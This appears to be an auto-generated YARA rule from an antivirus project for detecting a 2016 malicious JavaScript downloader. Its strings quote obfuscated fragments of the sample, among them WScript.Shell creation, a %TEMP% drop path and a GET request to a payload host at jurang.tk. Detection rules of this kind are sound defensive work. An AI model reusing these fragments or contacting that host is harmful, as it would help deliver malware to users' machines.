rule sig_20160427_fd145b3f648557f5aa045b69525cdf69 {
  meta:
    description = "datamaliciousorder - file 20160427_fd145b3f648557f5aa045b69525cdf69.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e9a2ea62829ee1014773f26126206e6262dfeac663b4aa7670c992f54cc65854"

  strings:
    $s1  = "function EodzpUuptj() {return RjpgrJxqad[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XueSy1u" ascii
    $s2  = "function EodzpUuptj() {return RjpgrJxqad[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"XueSy1u" ascii
    $s3  = "function QsvqeJzdbb(TpyobHfkrc, AsilgBqyju){DzdppCrukq = DzdppCrukq * 1; return TpyobHfkrc - AsilgBqyju;};" fullword ascii
    $s4  = "var RjpgrJxqad = function FbhlfIloil() {return XihtfSzcuf[RmipjGbgbk](\"WScript\"+\".Shell\");}(), ShmesYusqc = 11;" fullword ascii
    $s5  = "GwprzVxiaa[RkonsZmxgi](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var XihtfSzcuf = this[\"WScript\"];" fullword ascii
    $s7  = "if (GwprzVxiaa[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function ZbctaKjeko(){return RukyrRliur + \"\";};" fullword ascii
    $s9  = "function UcprbHmdze() {return ((AmcmcTroio == true) && (AmcmcTroio == HmwedWklbv)) ? 1 : DzdppCrukq;};" fullword ascii
    $s10 = "var HmwedWklbv = false;" fullword ascii
    $s11 = "}while (SngpxYuomo);" fullword ascii
    $s12 = "return QsvqeJzdbb(ZtdleAxhvl, NheuoSxkoj);" fullword ascii
    $s13 = "var DvwcgPuwok = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var DhqjqPbcno = false;" fullword ascii
    $s15 = "DhqjqPbcno = true;" fullword ascii
    $s16 = "function KwkgrAhnpl(EdxcyOmakc) {var PnxufCievi = (1, 2, 3, 4, 5, EdxcyOmakc); return PnxufCievi;};" fullword ascii
    $s17 = "function HrxgtDykpi(){return RmipjGbgbk;};" fullword ascii
    $s18 = "function FfedtZbylf()" fullword ascii
    $s19 = "function StuxsNmqir(){return 23;};" fullword ascii
    $s20 = "var AmcmcTroio = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}